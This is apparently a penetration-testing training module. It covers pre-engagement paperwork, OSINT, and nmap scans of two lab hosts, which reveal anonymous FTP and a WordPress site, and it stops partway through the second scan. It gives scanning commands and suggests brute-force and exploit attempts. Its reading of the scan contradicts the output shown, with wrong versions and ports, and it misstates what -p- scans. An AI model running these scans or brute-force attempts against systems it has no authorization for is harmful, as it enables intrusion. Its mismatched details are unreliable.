# Intro

* * *

In this module, we will see in practice how a penetration test could be conducted. We will go through each phase in detail so that you develop an understanding of why the individual components (discussed in `Introduction to Information Security`, `Introduction to Penetration Testing`, and `Penetration Testing Process`) exist and how they are interconnected. Furthermore, we want to illustrate the dependencies of these components and increase your understanding of how each one relates to the others .

#### Penetration Testing Recap

Penetration testing is an `authorized simulation` of a cyber attack, typically against an organization's network and it's subcomponents (such as web servers, mail servers, and applications). The purpose is to identify any security vulnerabilities that may exist within the client's IT systems, and fix them before a cybercriminal can take advantage. To accomplish this, the identified vulnerabilities are presented to the company in the form of a report, one which is designed to inform software developers, security teams, and administrators on how to best address the discovered issues.

Therefore, in this module, we will work through the entire process together so that you gain your first comprehensive experience with a penetration test. This hands-on approach will help you understand its requirements, how it works, what is needed to conduct one, and the benefits it provides to companies.

#### Penetration Testing Process

The penetration testing process consists of eight possible phases. Since these have already been explained in detail in the Penetration Testing Process module, here is just a brief summary of each phase:

- `Pre-Engagement`: In this phase, everything necessary for the actual penetration test is discussed, developed, defined, and documented in writing. Here we obtain the necessary permissions and rights to execute hacking attacks on predetermined systems and simulate a real cyber attack.

- `Information Gathering`: In this phase, we collect as much information as possible about the target company to understand exactly how it is structured, how it functions, what it depends on, and what technical resources it requires.

- `Vulnerability Assessment`: After collecting as much information as possible, this must be carefully analyzed and correlated to identify potential attack vectors that could lead to a successful attack.

- `Exploitation`: Here, the identified attack vectors are targeted and defense mechanisms are bypassed.

- `Post-Exploitation`: Once we have gained access to a target system to control it from the inside and gathered enough internal information, we attempt to escalate privileges to the highest possible level.

- `Lateral Movement`: This phase occurs when we use the compromised system to move through the internal network.

- `Proof-of-Concept`: From all our notes, screenshots, and documentation, a report is created with the individual steps to reproduce our actions for successfully identifying each vulnerability.

- `Post-Engagement`: This is the phase where we show the report to the client and discuss it together, answer questions, and help them close the vulnerabilities found.


![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](DFF04yovySyN)

Throughout this module, we will work through all phases and highlight them explicitly. Use this representation to orient yourself during your penetration tests; similar to map which shows your current location, and where to go next. It often happens that we get stuck at a certain point and truly do not know how to process. This process will help you determine:

1. if you haven't found something yet,
2. if you don't know something yet,
3. or if you're moving in the wrong direction.

Once you have gotten out of this "stuck" position, you'll realize that it is always one of these three points, and you can use this rule-of-thumb to make your own methodology faster and more effective.


# Scope Definition

* * *

After the initial request to conduct a penetration test, we find ourselves in the Pre-Engagement phase. Here, we conduct all necessary discussions, define the execution of the penetration test, and sign the required permissions in written form, which is then documented. However, before any of this can happen, it is necessary to sign an NDA to ensure confidentiality.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](oKSHo7IBlHSv)

* * *

## Non-Disclosure Agreement

An Non-Disclosure Agreement ( `NDA`) is a legal document that plays one of the most important roles in penetration testing. It is a written contract between two parties—the penetration tester and the company (customer) — that ensures any sensitive information shared between them remains confidential. When we look at a company's systems, we might encounter various sensitive details, such as:

- Security weaknesses that could be exploited
- Private company information and trade secrets
- Employee and customer data
- Details about how the company's systems work

The NDA creates a safe environment/agreement for both sides. The company can feel comfortable letting us examine their systems, knowing their secrets won't be shared with anyone and at the same time, we can work without worrying about legal problems that might come from handling sensitive information.

Often we can discover serious security problems that could damage the company if made public. For example, we might find ways to access private data or how to break into important, mission-critical systems. If this information were fall into the wrong hands, it could lead to real cyber attacks or data breaches. The NDA helps prevent these risks by making sure all findings stay confidential. Without this protection in place, neither the company nor we would feel safe working together. The NDA covers `everything about handling private information`, including how to store and share any information we find, such as:

- System details
- Software code
- Passwords
- Company rules
- Network setup

The NDA also states that we can't share our findings with others, or use them for personal benefit. It sets clear rules about which systems we can and can not access during testing. Some topics should only be discussed after both parties sign the NDA, and any conversations that happen prior to the NDA should stay general. However, after signing, you are free to talk about almost everything including:

- Which systems will be tested
- Past security problems
- Important company processes
- Login details needed for testing

This careful approach keeps everyone's information safe and helps create a good working relationship. Now, for the practical aspect, let’s say we already have a signed NDA.

* * *

## The Scoping Process

With the NDA signed, we can now define the actual scope. Two main tools help plan a penetration test:

1. the scoping questionnaire and
2. the scoping document.

The `scoping questionnaire` is a checklist that helps gather basic information about what needs to be tested. It asks about the company's systems, security needs, and goals for the test. An example of such a questionnaire can be found [here](https://navisec.io/scoping-questionnaire/).

The `scoping document` is more detailed. It's created using information from the questionnaire and clearly explains what will be tested, how it will be tested, and what the limits are.

These tools help make everything clear by covering (in this example):

- Which systems will be tested: 2 hosts in total, 1 Web Application running on Linux, 1 Windows-based server (both IPs given after spawning the targets)
- What type of testing will be done: Black box
- What the test aims to achieve: Ensure the new small environment is secure.

In the real world, the scoping questionnaire and document will be much more extensive. However, for the purposes of this module, this case is enough. Even now, using these two tools will help us avoid confusion and keep the project on track.

#### Defining the Scope of Work

Before we can start with the penetration testing engagement, the final plan needs to include:

- `Goals`: What the company wants to achieve - in our case: cyber security assessment confirming their systems are secure

- `Limits`: What will and won't be tested - only the 2 provided hosts (Web application on Linux and the Windows host)

- `Methods`: How the testing will be done - Black box, without prior knowledge of the web application, the Linux host nor the Windows host

- `Schedule`: When things will happen - for us: take your time as much as you need

- `Our Role`: Assisting our penetration testing team during their engagement

- `Results`: What reports and recommendations will be provided - we are tasked to provide our findings to the team lead


A clear plan helps everyone understand what to expect and ensures the testing provides real value to the company.


# Rules of Engagement

* * *

The Rules of Engagement ( `RoE`) is a document that explains how a penetration test will be done. It's an agreement between the client and testing team that clearly states what is allowed and what isn't. This document is important because it helps avoid confusion and sets clear expectations.

* * *

#### Defining the Boundaries

The RoE lists `which systems and networks` can be tested. It also states when testing can happen - during work hours or after. The document also explains which testing methods cannot be used, like attacks that could shut down services, to avoid harming the business.

Testers follow these rules to stay within `legal and ethical limits`. Companies can ask for changes to protect sensitive systems. This agreement keeps both sides safe and helps the test stay on track.

* * *

#### Contact Information

Good communication is essential during a penetration test. The document includes `contact details` for important people on both sides. This includes names, roles, email addresses, and phone numbers of people who can help when needed.

Sometimes problems can occur during testing. For example, a tester might accidentally trigger an alarm or interrupt a service. Having the right contact person helps fix issues quickly. Also, if testers find a serious security problem, they need to tell the client right away.

* * *

#### Lines of Communication

Before testing starts, everyone agrees on how they will communicate. This might include email, secure messaging, or special ticketing systems.

Different situations need different ways of communicating. Regular updates might be sent `by email`, while urgent issues might need a `phone call`. There's also a clear plan for who to contact when serious problems are found.

Testers are encouraged to ask questions when things aren't clear. For example, if they find unexpected systems, they can check with the client to make sure they're staying within the agreed limits.

* * *

#### Objectives

Every penetration test starts with clear goals. These goals are set during planning and tell us what we need to test. Common goals might include checking how safe external networks are, `finding weaknesses` in websites, or testing how well internal systems are protected against threats from inside the organization.

Different companies have different testing needs. For example, banks might need tests to make sure they follow specific security rules (like PCI DSS), while new tech companies might focus more on testing their cloud systems and APIs.

These goals also help us know if the test was successful. We can compare what we found to what we planned to check, helping both the client and testers see if the test did what it was supposed to do.

* * *

#### Evidence and Information Handling

Since we collect sensitive information like `logs` and `screenshots` that show security problems during the penetration test, we also must handle this information carefully and document everything properly.

To keep this information safe, we must use secure storage and encrypted connections in our environment and ensure this information cannot be accessed by unauthorized or involved parties. For example, they might store evidence on encrypted drives that only certain people can access. They also keep detailed records of everything they do during the test.

After the test is finished, testers follow strict rules about destroying client data. They safely delete all client information from their systems after delivering the final report to protect confidentiality.

* * *

#### Disclaimers and Liability

Every penetration testing agreement includes sections that explain `who is responsible for what`. These sections protect both the testing team and the client by making it clear what happens if something goes wrong.

For example, if testers discover and exploit a vulnerability that nobody knew about before, they won't be responsible for any damage it might cause. Sometimes tests might accidentally cause problems, like temporarily slowing down a system. These agreements help prevent legal problems if such issues happen.

The agreements also remind clients that the test only shows security issues at that specific time. Just because a system is secure today doesn't mean it will stay secure forever. This is why regular security testing is important.

* * *

#### Permission

Without `explicit authorization` and permission from the client, all the activities conducted during the penetration test could be considered illegal. To mitigate this risk, clients provide a formal document granting the testing team permission to probe their systems.

In real-world scenarios, this authorization is often quite detailed, and usually includes specific IP addresses, domains, or systems that are in scope, as well as timeframes and conditions under which we should test. Basically, it is a set of environmental conditions we have to meet during testing. Once we've obtained this written authorization, it confirms that we're operating within the bounds of the law, on client's request, protecting us from accusations of unauthorized access.

Additionally, real-world permissions often involve coordination with third-party vendors or service providers. For example, if we identify a part of client’s infrastructure that is hosted on a cloud platform, we may need additional authorization from the corresponding cloud provider to avoid violating their terms of service because they all have guidelines on how to reach out when a penetration test needs to be conducted on their platform for a client. This step highlights the importance of thorough preparation and communication before the test begins.


# Agreement & Preparation

* * *

Before starting a penetration test, we need a clear agreement between the testing team and the organization. This agreement/contract consists of everything that has been previously discussed, and helps everyone understand what will happen during the test. The agreement can be divided into three categories, each comprised of several important parts:

#### Legal

1. A `Non-Disclosure Agreement` ( `NDA`): This is a legal document that requires the testing team to keep all sensitive information private. It protects both the organization's data and the details of any security weaknesses found during testing.

2. `Permission to test`: This is a formal document that gives the testing team legal permission to do their work. Without it, their activities might look like illegal hacking. Usually, this comes as a signed authorization letter.

3. `Contact information`: The agreement lists everyone involved in the test and their roles. This includes the main contact person at the organization, the testing team, and emergency contacts. Having clear communication channels helps deal with any issues quickly.


#### Scope & Rules

1. `A scoping questionnaire and document`: These explain exactly what will be tested. The questionnaire asks about the organization's systems and goals, while the document lists which networks and applications will be tested and which ones won't be.

2. `Rules of engagement` ( `ROE`): This document explains how the testing will be done. It covers things like when testing can happen, what methods can be used, and what to do if something goes wrong. For example, it might say whether testers can try to trick employees (social engineering) or if they should avoid testing during busy hours.


#### Contract

1. `Timeline`: This part shows when each phase of the test will happen, from start to finish. It includes time for preparing, testing, and writing reports. It also adds extra time for unexpected issues.

2. `Responsibilities`: This section outlines who is responsible for what (client & testers) during the test. It includes who will oversee the testing, who needs to be available during critical testing phases, who handles emergencies, and who is responsible for reviewing and acting on the findings.

3. `Deliverables`: These are the final products that will be provided to the organization after testing. This typically includes detailed reports of findings, technical documentation, and recommendations for improvements. The agreement should specify the format, level of detail, and timeline for delivering these materials.


In short, this agreement is like a roadmap that keeps everyone on track and ensures the test is done properly and legally, while protecting both the company and the testing team for such an activity. Most importantly, it helps achieve the main goal: finding and fixing security problems to better protect the organization.

* * *

## Penetration Testing Assignment

As a junior penetration tester, you typically won’t send or discuss a report directly with the customer until you’ve reviewed several examples and worked on reports with guidance. Juniors usually accompany senior testers to learn from them, expand their repertoire, understand various processes and approaches, and ultimately master how to manage an engagement from start to finish.

As the senior penetration testers take care of the customer and communication, it can happen that junior penetration testers are assigned a host or even a network segment to work on independently. This allows the opportunity to gain hands-on experience in a real environment and practice creating documentation. Assignments are often made verbally, but can also be made in writing. A written assignment is a more formal and serious approach, and usually comes with the expectation that you produce a report.

* * *

## Preparation

Before starting any penetration test, we must set up a clean environment—typically a virtual machine. This means creating an organized workspace for each new test, ensuring that no residual data from previous tests is accidentally included. Using data or files from past tests can lead to errors and may inadvertently expose private information from other clients (cross-contamination), which we want to avoid. Moreover, having a dedicated, clean workspace allows us to conduct more effective testing, as all files, logs, results, screenshots, and notes are neatly organized and easily managed. With everything in order from the beginning, we can focus on identifying vulnerabilities and documenting our findings for the report.

The consequences of failing to maintain a clear testing environment are particularly severe when the leaked information contains dangerous or critical details. For example, if a report accidentally includes exploit code, passwords, or detailed system architecture diagrams from a previous client, the new client could use this information maliciously or negligently. Worse, if the information allows the identification of the original client (e.g., through IP addresses, domain names, or company-specific data), the breach becomes even more damaging.

Such incidents not only endanger the security of the affected organizations but also erode trust in the penetration testing process. Clients rely on testers to handle their sensitive data with the utmost care, and any failure to do so undermines the credibility of the entire industry.

While this section provides a high-level overview and reasoning of the importance of a clear testing environment, the specifics of setting up and preparing such an environment are extensive and depend on the tools, methodologies, and objectives of the penetration test. All the detailed instructions on configuring VMs, installing tools, and ensuring isolation go beyond the scope of this module. For comprehensive guidance, refer to the [Setting Up](https://academy.hackthebox.com/module/details/87) Module, which covers step-by-step procedures for preparing a penetration testing environment.


# Publicly Available Data

* * *

Before starting any network enumeration and analysis, it's important to first understand the company or organization you're looking at. This helps make sure your analysis is focused and relevant. A good first step is to collect publicly available information about the company, which can tell us about their systems, tools, and potential weak points. In simple terms, gathering public information is key to understanding a company before testing its network security. This research can help you in both the planning and execution of your test. Using sources like websites, social media, and code repositories helps create a complete picture of the company's setup and possible security weaknesses.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](yZYG7H6D9tUE)

#### Gathering Public Data

To gain a thorough understanding of a company, you need to gather publicly available information—a process known as Open Source Intelligence (OSINT). This is vast topic that cannot be covered within a few section. But when you want to understand how to obtain all the necessary information about a company you can use the [OSINT: Corporate Recon](https://academy.hackthebox.com/course/preview/osint-corporate-recon) module to learn it. This includes basic details about the company’s operations, services, location, and technology. You can find this information from various sources, such as company websites, news releases, financial reports, and social media. Company websites typically provide insights into the company’s offerings and services. For publicly traded companies, annual reports can reveal financial performance and partnerships. Social media platforms like LinkedIn and Twitter offer information about employees and recent company updates

You can also learn a lot from public records, such as business licenses and patents, which provide insights into the company's legal structure and assets. Additionally, knowing where the company has offices can help you understand its operational setup and identify potential security concerns.

#### Understanding Connections

After collecting this information, you can see what other companies and tools the organization depends on. This includes their business partners, suppliers, and the software they use. These connections could have security risks that need to be checked. Looking at job postings and employee profiles can tell you what software the company uses. Job listings often mention specific computer programs or systems that employees need to know. This gives you clues about their technology.

Social media, especially LinkedIn, is great for learning about the company's tech staff. By looking at their profiles, you can see what they're good at and what projects they've worked on. GitHub, where developers share code, is another useful source of information.

GitHub can tell you a lot about how a company builds software. Sometimes companies share their tools publicly, which shows how they work. These shared files might include instructions or examples of how they use different technologies. Sometimes, developers accidentally share sensitive information. For example, they might accidentally include access points, passwords, or secret keys in their code. This can be dangerous because others could use this information to attack and break into their systems.

#### Putting It All Together

By combining all this information, you can get a good picture of how the company works and what systems they use. This helps you know where to look during security testing. For example, if you know a company uses a specific cloud-based file sharing service, you could see if there are any CVE's associated with it, or use it to craft a more convincing phishing attack.


# Network and Service Scanning

* * *

Network and service scanning is a foundational step in penetration testing and security assessments. It involves identifying active hosts, open ports, and running services within a defined scope, and is used to gain a comprehensive understanding of the target environment. [Network Mapper](https://x.com/i/grok?text=Network%20Mapper) ( `Nmap`) is the most widely used tool for this purpose, due to its versatility, accuracy, and extensive feature set. By scanning the network, testers can map the attack surface, identify potential vulnerabilities, and prioritize targets for further analysis. This section explores the process of network scanning, provides a practical example using Nmap, and explains how the results can be leveraged to identify "low-hanging fruits"—easily exploitable vulnerabilities or misconfigurations.

* * *

## Understanding the Assigned Scope

Before initiating a scan, it is critical to define and understand the scope of the assessment. The scope typically includes a range of IP addresses, domains, or systems that the client has authorized for testing. For example, a scope might consist of a single subnet, such as 10.129.12.0/24, which encompasses all IP addresses from 10.129.12.0 to 10.129.12.255. Understanding the scope ensures that testing remains within legal and ethical boundaries and focuses on the systems relevant to the client’s objectives.

The primary goal of network scanning is to identify active hosts within the scope and determine the services they expose. Active hosts are systems that respond to network probes, indicating they are online and potentially part of the target environment. Services, on the other hand, are applications or protocols running on specific ports, such as HTTP (port 80), SSH (port 22), or SMB (port 445). By mapping these services, we can infer the purpose of each system, its role in the network, and potential attack vectors.

Next, we will start enumerating the network. Therefore, follow up the commands from here on Pwnbox. You will see many different tools to be used. Do not be afraid to experiment and try different techniques. You will learn those tools in detail later.

#### Using Nmap for Network Scanning

Nmap is a powerful, open-source tool designed for network discovery and security auditing. It supports a wide range of scanning techniques, from simple ping scans to advanced service enumeration and vulnerability detection. Nmap’s flexibility allows testers to tailor scans to specific objectives, such as identifying open ports, detecting operating systems, or scripting custom probes. The [Network Enumeration with Nmap](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) will teach you in detail how to enumerate and gather all the information of a network or host.

Let’s consider a practical example of scanning the 10.129.12.0/24 network that's been assigned to us, which contains only two hosts. To perform the scan, we can use the following Nmap command:

```shell
nmap -sV -p- 10.129.12.0/24 -oA network-scan

```

- `sV`: Enables service version detection, which attempts to identify the software and version running on each open port.

- `-p-`: Scans all 65,535 ports (both TCP and UDP) to ensure no services are missed.

- `-oA network-scan`: Save the results of the scan to a file called "network-scan".

- `10.129.12.0/24`: Specifies the target network range.


Assuming the scan identifies the two hosts, the output might look like this (simplified for clarity):

```shell
nmap -sV -p- 10.129.12.0/24 -oA network-scan

Starting Nmap 7.94 ( <https://nmap.org> )
Nmap scan report for 10.129.12.10
Host is up (0.0012s latency).
PORT     STATE SERVICE          VERSION
21/tcp   open  ftp              ProFTPD
22/tcp   open  ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http             nginx 1.18.0 (Ubuntu)
443/tcp  open  ssl/http         Apache httpd 2.4.52 ((Ubuntu))
8000/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
8001/tcp open  ssl/vcom-tunnel?
8080/tcp open  http             Apache httpd 2.4.52 ((Ubuntu))
8889/tcp open  ssl/http         Golang net/http server

Nmap scan report for 10.129.12.20
Host is up (0.0015s latency).
PORT     STATE SERVICE         VERSION
22/tcp    open  ssh            OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2019 Standard 17763 microsoft-ds
3000/tcp  open  http           Golang net/http server
3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp  open  ssl/http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
8889/tcp  open  ssl/http       Golang net/http server
49669/tcp open  msrpc          Microsoft Windows RPC

Nmap done: 256 IP addresses (2 hosts up) scanned in 12.34 seconds

```

* * *

## Interpreting the Scan Results

The Nmap output provides a detailed snapshot of the network, highlighting the active hosts and their open ports. Let’s break down the results for each host:

#### 10.129.12.10

- `Port 21` (FTP): Running vsftpd 3.0.3, a popular FTP server. FTP is often a target for attacks due to weak authentication mechanisms or misconfigurations.

- `Port 22` (SSH): Running OpenSSH 8.2p1. SSH is a secure protocol, but vulnerabilities in older versions or weak credentials could be exploited.

- `Port 80` (HTTP): Hosting an Apache httpd 2.4.41 web server. Web servers are common attack vectors, especially if they host vulnerable applications or misconfigured settings.

- `Port 443` (HTTPS): Also running Apache httpd 2.4.41 with SSL/TLS. HTTPS services may be vulnerable to SSL/TLS misconfigurations or outdated cipher suites.

- `Port 4369` (Erlang Port Mapper Daemon): Used by Erlang-based applications. This service is less common and may indicate a specialized application, potentially misconfigured or vulnerable.


#### 10.129.12.20

- `Port 22` (SSH): Running OpenSSH for Windows 9.5. SSH provides secure remote access, though Windows-specific implementations may have unique security considerations.

- `Port 139` (NetBIOS): A legacy protocol used for file sharing and printer services. It is often targeted in attacks due to historical vulnerabilities.

- `Port 445` (SMB): Running Microsoft’s Server Message Block protocol, critical for file sharing in Windows environments. SMB has been a target for major exploits like EternalBlue.

- `Port 3000` (HTTP): Running a Golang net/http server. Web applications on non-standard ports may indicate internal services or development environments that require security review.

- `Port 3389` (RDP): Microsoft’s Remote Desktop Protocol, used for remote administration. RDP is frequently targeted for brute-force attacks or exploits if not properly secured.


* * *

## Leveraging the Results

The scan results provide a great overview for further testing. Testers can prioritize targets based on the identified services and their associated risks. For example:

- `Vulnerability Scanning`: Use tools like Nessus or OpenVAS to scan for known vulnerabilities in the identified software versions.

- `Credential Testing`: Attempt brute-force attacks on services like FTP, SSH, and RDP to test for weak passwords.

- `Configuration Analysis`: Review the configuration of web servers (ports 80/443) and message brokers (port 8161) for misconfigurations, such as default credentials or insecure settings.

- `Exploit Testing`: If vulnerabilities are identified, attempt to exploit them using frameworks like Metasploit to assess their impact.


By systematically analyzing the scan results and focusing on low-hanging fruits, testers can efficiently identify and address critical vulnerabilities, improving the overall security posture of the target environment.

* * *

## Note Taking

Thorough note-taking is essential. You should write down everything you do, including all commands you run and everything you find. This has several benefits. It allows your team members to check your work and understand the actions you took. Write down exactly which commands you used, when you used them, and what happened. For example, if you ran an Nmap scan, write down the exact command you typed and what the results were, including any error messages.

Additionally, good notes help you keep track of what you're doing. When you find something interesting, like a possible “low hanging fruit” (that we will discuss next), write down:

- What you found
- Why you thought it was important
- What made you decide to look into it further

Third, having quality notes will make it much easier for you to write your final report. If you keep clear, organized notes during your work, you can easily:

- Find specific problems you discovered
- Show proof of security weaknesses
- Explain exactly how you found each problem.

It's helpful to include screenshots and the results of commands you ran that led to important discoveries.

Keep your notes organized and easy to read. Use clear headings and a consistent format. The `markdown` format is recommended since it allow easy and quick styling. You can use tools like Notion, OneNote, or special security testing tools to help organize your notes. Remember to include the date and time for everything you do, and list any outside tools or resources you used.


# Low Hanging Fruits

* * *

In the context of cybersecurity and penetration testing, a "low-hanging fruit" refers to a vulnerability or misconfiguration that is relatively easy to identify, exploit, or remediate. These are often issues that require minimal effort or technical expertise to address, yet they can provide significant security benefits or, in the case of attackers, quick access to a system. Examples include unpatched software with publicly available exploits, default credentials, or exposed services with known weaknesses. The term originates from the analogy of picking fruit that is easily accessible without needing to climb high into a tree.

The primary goal of searching for low-hanging fruits is to identify initial entry points that can lead to further exploitation or remediation. These starting points often reveal dependencies, misconfigurations, or weaknesses that can be leveraged to gain deeper access or improve security. For example, exploiting a vulnerable service might provide credentials or access to internal systems, enabling lateral movement within the network.

However, the concept of what constitutes a low-hanging fruit is subjective and depends on experience. For seasoned professionals, a low-hanging fruit might be an application with a publicly released exploit that is easy to find and use. For novices, even identifying which services or applications to research requires guidance. This highlights the importance of experience in recognizing patterns, understanding common vulnerabilities, and knowing where to look for exploits.

At this point, we are jumping between the Information Gathering and the Vulnerability Assessment stage. We pick a service and do our research on it if we are not sure what exactly we are dealing with. At the same time we assess the risk of this service, looking into its security history and keeping an eye open for any publicly known vulnerabilitities.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](fNUDB7VPnbRd)

Focusing on low-hanging fruits is critical for several reasons. First, these vulnerabilities represent the most immediate and accessible risks to an organization. Attackers often target these weaknesses because they offer a high return on investment—quick wins with minimal effort. By addressing low-hanging fruits first, organizations can significantly reduce their attack surface and mitigate risks before attackers exploit them.

Second, identifying and resolving these issues builds momentum in a security program. Quick wins boost team morale, demonstrate progress, and establish a foundation for tackling more complex challenges. For penetration testers, finding low-hanging fruits provides an entry point into the target environment, enabling further exploration and deeper analysis.

* * *

## Searching for Low Hanging Fruits

People often make the mistake of "zeroing-in" on a single service, trying to exploit it before even before understanding the purpose of the target It is highly recommended (especially at the beginning of your journey) to work with what you see. If you pay attention to detail throughout the information gathering stage, and do proper research to understand the information you've obtained, most problems will disappear. Problems for penetration testers usually begin when:

- They didn’t pay attention (have a typo in commands, using wrong port, overlooked details)

- They are overthinking/hallucinating (making things too complex, do not know what they are doing the steps for, make to quick conclusions)


Most often they experience it because of, but not limited to:

- They do not know where to start (didn’t pay attention)
- They do not know what to look for (didn’t pay attention)
- They do not know what to do with it (didn’t pay attention)
- They do not know how to do it (overthought)
- They do not know why something does not work (didn’t pay attention and/or overthought)
- They do not know how to make it work (didn’t pay attention and/or overthought)

* * *

## Target: 10.129.12.10

Let’s pick the 10.129.12.10 target and examine TCP ports 21 and 443 first. These two TCP ports are used quite often, and is common for them misconfigured or even vulnerable to certain attacks. For now, we do not need to do anything fancy, and can just work with what we see.

```shell
sudo nmap -p21,22,443 -sV -sC 10.129.12.10

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-02-15 15:29 EST
Nmap scan report for cube-case.htb (10.129.12.10)
Host is up (0.027s latency).

PORT    STATE SERVICE
21/tcp  open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
443/tcp open  https
|_http-title: Cube Case
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cube-case.htb/organizationName=Organization/stateOrProvinceName=State/countryName=US
| Not valid before: 2025-02-15T18:00:13
|_Not valid after:  2026-02-15T18:00:13
| tls-alpn:
|_  http/1.1
|_http-generator: WordPress 6.7.2

Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds

```

From the results of the scan, we can see that Nmap discovered anonymous access for the FTP port TCP/21. Administrators might use or allow anonymous FTP login in their business infrastructure to simplify file sharing for external users, or the public (using it to distribute software updates, manuals, or open datasets.) It eliminates the need for individual user accounts, reducing management overhead, especially in scenarios where authentication isn’t critical and the data isn’t sensitive.

However, if an administrator configures the FTP server for internal use in a way that inadvertently exposes it to the public, it can lead to data exposure and unauthorized access to internal data.

So, we've now obtained several important pieces of information that we can benefit from. We see that there is a file called `WordPress_Blog_Setup_Update.txt` , and also know there is a user and group called `john` . Information like this should definitely be written down, as it may become useful to us later on.

On TCP port 443, we see a webserver using TLS/SSL with the title `Cube Case` . The `ssl-certificate` subject contains the domain name `cube-case.htb` , and shows that it’s using WordPress CMS with the version 6.7.2. When we visit the website `https://10.129.12.10` we see a sample WordPress page. A sample page serves as an initial placeholder (like the default settings when you buy a smartphone) and can indicate several things; either it has been installed recently, or admins forgot about it and left it as it is. Incidentally, both cases can lead to breach for a business.

![Cube Case blog page with 'Hello world!' post, welcoming users to WordPress, dated February 15, 2025.](AT8LeiZzK2Dp)

Now, let’s summarize what we have figured out so far:

- Operating System: Ubuntu
- File sharing: FTP on 21
- Remote Access: SSH on 22
- Web Server: WordPress 6.7.2
- Domain: cube-case.htb

This is sufficient for now, as we know what types of systems we will be dealing with moving forward. WordPress has many attack vectors that require some time to assess, and this will be the part of information gathering and vulnerability assessment stages (which we will jump into shortly). So, at this moment, we will focus on the next target with the IP address 10.129.12.20.

* * *

## Target: 10.129.12.20

Let’s use another scan method for this target which includes version detection and script application for the running services.

```shell
sudo nmap -p- -sV -sC 10.129.12.20 -T5 -Pn

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-02-23 16:06 EST
Nmap scan report for 10.129.12.20
Host is up (0.029s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3000/tcp  open  http          Golang net/http server
|_http-title:  Cube Case Gitea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=e395a074552264a2; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=uZ6gm5xTwEmOsxJTg4e-1VuKws06MTc0MDM0NDg4MzEwNTMzMjgwMA; Path=/; Expires=Mon, 24 Feb 2025 21:08:03 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 23 Feb 2025 21:08:03 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Cube Case Gitea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ3ViZSBDYXNlIEdpdGVhIiwic2hvcnRfbmFtZSI6IkN1YmUgQ2FzZSBHaXRlYSIsInN0YXJ0X3VybCI6Imh0dHA6Ly8wLjAuMC4wOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly8wLjAuMC4wOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMn
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=7c2f23bd7c3f6266; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=snXz9bwqPGeywxtPwsHN6nXb3es6MTc0MDM0NDg4MzQyNjkzMjgwMA; Path=/; Expires=Mon, 24 Feb 2025 21:08:03 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 23 Feb 2025 21:08:03 GMT
|_    Content-Length: 0
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
